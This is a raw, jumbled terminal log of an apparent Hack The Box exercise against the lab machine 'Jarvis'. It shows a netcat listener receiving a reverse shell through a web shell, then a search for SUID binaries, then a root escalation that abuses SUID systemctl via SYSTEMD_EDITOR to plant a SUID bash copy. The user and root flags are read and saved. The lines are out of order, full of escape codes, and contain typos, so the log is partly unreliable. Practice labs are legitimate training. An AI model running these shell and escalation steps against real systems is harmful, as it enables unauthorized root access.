[33m/[33mv[33ma[33mr[33m/[33mw[33mw[33mw[33m/[33mA[33md[33mm[33mi[33mn[33m-[33mU[33mt[33mi[33ml[33mi[33mt[33mi[33me[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33mr[33m.[33mp[33my[33m [33m-[33mp[33m"[39m[2C[?1l>[?2004l
+[1] 841280
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:34:10][39m $ [K[?1h=[?2004hcurl: (28) Operation timed out after 10006 milliseconds with 0 bytes received
+
+[1]  + exit 28    curl -sS --max-time 10 -G "http://$Bo
+$ [10:34:43] stty raw -echo; fg
+
+$ [10:45:35] loot flag user b6b395e0f4f02a513f12fa89ab824866
+xIP/shell.php" --data-urlencode 
+[0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:34:20][39m $ [Kl[4ml[24m[4ml[4mo[24m[4ml[4mo[4mo[24m[4mo[4mt[24m[24m[32ml[24m[32mo[24m[32mo[24m[32mt[39m[32mt[32m [39m[32mt[39m[39m flag user b6b395e0f4f02a513f12fa89ab824866[?1l>[?2004l
+[+] Flag saved:  user = b6b395e0f4f02a513f12fa89ab824866  →  loot/flags.txt
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:45:35][39m $ [K[?1h=[?2004hloot flag user b6b395e0f4f02a513f12fa89ab824866[47D[32ml[32mo[32mo[32mt[39m[43C [90m6[39m [39m [90m66[39m [39m [39m [90m866[39m [39m [39m [39m [90m4866[39m [39m [39m [39m [39m [90m24866[39m [39m [39m [39m [39m [39m [90m824866[39m [39m [39m [39m [39m [39m [39m [90mb824866[39m [39m [39m [39m [39m [39m [39m [39m [8D[90mab824866[39m[8D [39m [39m [39m [39m [39m [39m [39m [39m [9D[90m9ab824866[39m[9D [39m [39m [39m [39m [39m [39m [39m [39m [39m [10D[90m89ab824866[39m[10D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [11D[90ma89ab824866[39m[11D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [12D[90mfa89ab824866[39m[12D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [13D[90m2fa89ab824866[39m[13D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [14D[90m12fa89ab824866[39m[14D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [15D[90mf12fa89ab824866[39m[15D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [16D[90m3f12fa89ab824866[39m[16D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [17D[90m13f12fa89ab824866[39m[17D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [18D[90m513f12fa89ab824866[39m[18D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [19D[90ma513f12fa89ab824866[39m[19D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [20D[90m2a513f12fa89ab824866[39m[20D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [21D[90m02a513f12fa89ab824866[39m[21D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [22D[90mf02a513f12fa89ab824866[39m[22D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [23D[90m4f02a513f12fa89ab824866[39m[23D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [24D[90mf4f02a513f12fa89ab824866[39m[24D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [25D[90m0f4f02a513f12fa89ab824866[39m[25D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [26D[90me0f4f02a513f12fa89ab824866[39m[26D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [27D[90m5e0f4f02a513f12fa89ab824866[39m[27D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [28D[90m95e0f4f02a513f12fa89ab824866[39m[28D [39m [39m [39m [39m [39m [39m [39m 
+$ [10:45:49] loot flag root e168a89962e557d382ff182aa03b80d6
+
+Script started on 2026-09-04 10:29:26+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/7" COLUMNS="117" LINES="25"]
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:29:26][39m $ [K[?1h=[?2004hn[4mn[24m[4mn[4mc[24m[24m[32mn[24m[32mc[39m[32mn[32mc[32m [39m[32mn[32mc[39m[39m -lvnp 4444[?1l>[?2004l
+Listening on 0.0.0.0 4444
+Connection received on 10.129.1.73 51996
+bash: cannot set terminal process group (544): Inappropriate ioctl for device
+bash: no job control in this shell
+pepper@jarvis:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+pepper@jarvis:/var/www/html$ ^Z
+zsh: suspended  nc -lvnp 4444
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/HackTheBox/Jarvis[39m [33m[10:34:36][39m $ [K[?1h=[?2004hstty raw -echo; fg[18D[32ms[32mt[32mt[32my[39m[12C[32mf[32mg[39m[?1l>[?2004l
+[1]  + continued  nc -lvnp 4444
+
+pepper@jarvis:/var/www/html$ export TERM=xterm
+pepper@jarvis:/var/www/html$ id && whoami && hostname
+uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
+pepper
+jarvis
+pepper@jarvis:/var/www/html$ sudo -l
+[sudo] password for pepper: 
+Sorry, try again.
+[sudo] password for pepper: 
+Sorry, try again.
+[sudo] password for pepper: 
+sudo: 3 incorrect password attempts
+pepper@jarvis:/var/www/html$ find / -type f -perm -4000 -printf '%m %u %p\n' 2>/ddev/null | sort -n
+4750 root /bin/systemctl
+4754 root /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+4755 root /bin/fusermount
+4755 root /bin/mount
+4755 root /bin/ping
+4755 root /bin/su
+4755 root /bin/umount
+4755 root /usr/bin/chfn
+4755 root /usr/bin/chsh
+4755 root /usr/bin/gpasswd
+4755 root /usr/bin/newgrp
+4755 root /usr/bin/passwd
+4755 root /usr/bin/sudo
+4755 root /usr/lib/eject/dmcrypt-get-device
+4755 root /usr/lib/openssh/ssh-keysign
+pepper@jarvis:/var/www/html$ printf '%s\n' '#!/bin/sh' 'cp /bin/bash /tmp/jarvis--bash' 'chmod 4755 /tmp/jarvis-bash' > /tmp/jarvis-editor.sh
+pepper@jarvis:/var/www/html$ chmod +x /tmp/jarvis-editor.sh
+pepper@jarvis:/var/www/html$ script -qc 'SYSTEMD_EDITOR=/tmp/jarvis-editor.sh sysstemctl edit basic.target' /dev/null 2>&1
+Editing "/etc/systemd/system/basic.target.d/override.conf" canceled: temporary file is empty.
+pepper@jarvis:/var/www/html$ ls -la /tmp/jarvis-bash
+-rwsr-xr-x 1 root pepper 1099016 Sep  4 05:40 [0m[37;41m/tmp/jarvis-bash[0m
+pepper@jarvis:/var/www/html$ /tmp/jarvis-bash -p -c 'id && whoami && hostname'
+uid=1000(pepper) gid=1000(pepper) euid=0(root) groups=1000(pepper)
+root
+jarvis
+pepper@jarvis:/var/www/html$ /tmp/jarvis-bash -p -c 'cat /home/pepper/user.txt'
+b6b395e0f4f02a513f12fa89ab824866
+pepper@jarvis:/var/www/html$ /tmp/jarvis-bash -p -c 'cat /root/root.txt'
+e168a89962e557d382ff182aa03b80d6
+pepper@jarvis:/var/www/html$ /tmp/jarvis-bash -p -c 'whoami && hostname && ip a &&& cat /root/root.txt'
+root
+jarvis
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether a2:de:ad:ae:2e:97 brd ff:ff:ff:ff:ff:ff
+    inet 10.129.1.73/16 brd 10.129.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::a0de:adff:feae:2e97/64 scope global mngtmpaddr dynamic 
+       valid_lft 86396sec preferred_lft 14396sec
+    inet6 fe80::a0de:adff:feae:2e97/64 scope link 
+       valid_lft forever preferred_lft forever
+e168a89962e557d382ff182aa03
+$ [10:48:12] cat $BoxDir/loot/flags.txt
+cat $BoxDir/loot/creds.txt
+
+$ [10:48:57] cp $BoxDir/Jarvis.log ~/Documents/Obsidian/main-vault/OSCP/BOXES/BOX\ LOGS/Jarvis.log
